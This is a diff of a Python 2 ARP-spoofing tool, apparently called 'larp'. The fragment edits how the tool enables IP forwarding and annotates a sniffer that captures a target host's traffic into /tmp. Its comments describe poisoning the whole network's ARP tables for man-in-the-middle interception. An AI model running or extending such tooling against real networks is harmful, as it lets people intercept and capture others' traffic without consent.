@@ -7,7 +7,7 @@
 # provide it an argument with the gateway ip
 # it will arp the entire network to your' machine
 # use threading to arp individual clients
-# and setup a shell so that when you send an id it stops certain arps.
+# and setup a shell so that when you send an id it stops certain arps
 import sys
 import multiprocessing
 import subprocess
@@ -146,18 +146,17 @@ class larp():
                 temp_ip = f.readlines()                 # get teh ip from the file
                 temp_ip = [ x.strip() for x in temp_ip ]
                 f.close()                               # remove EOL and close file
-            if sys.platform == "linux":
-                with open("/proc/sys/net/ipv4/ip_forward", "r") as forward_file:
-                    data = forward_file.read()
-                    data = data.strip()                     # check if ipv4 forward
-                    forward_file.close()                    # is active
-                print colored("[^] ip_forward configuration: %s" % data, "blue")
-                if "0" in data:                             # if data is 0
-                    print colored("[!] modifing /proc/sys/net/ipv4/ip_forward to 1"\
-                    , "red")
-                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                        f.write("1")                        # modify the ip_forward to on
-                        f.close()
+            with open("/proc/sys/net/ipv4/ip_forward", "r") as forward_file:
+                data = forward_file.read()
+                data = data.strip()                     # check if ipv4 forward
+                forward_file.close()                    # is active
+            print colored("[^] ip_forward configuration: %s" % data, "blue")
+            if "0" in data:                             # if data is 0
+                print colored("[!] modifing /proc/sys/net/ipv4/ip_forward to 1"\
+                , "red")
+                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                    f.write("1")                        # modify the ip_forward to on
+                    f.close()
             print colored("[*] Retreiving mac addrs", "green")
             for ip in temp_ip:
                 temp = get_mac(ip)
@@ -180,7 +179,7 @@ class larp():
     def sniffer(self, target_ip):
         ''' sniff for http trafic on particular host '''
         bpf_filter = "ip host %s" % target_ip
-        os.mkdir("/tmp/larp_%s" % target_ip)
+        os.mkdir("/tmp/larp_%s" % target_ip)            # create the host directory
         f_i = 0
         while True:
             packets = sniff(filter=bpf_filter, iface=self.interface, count=1)
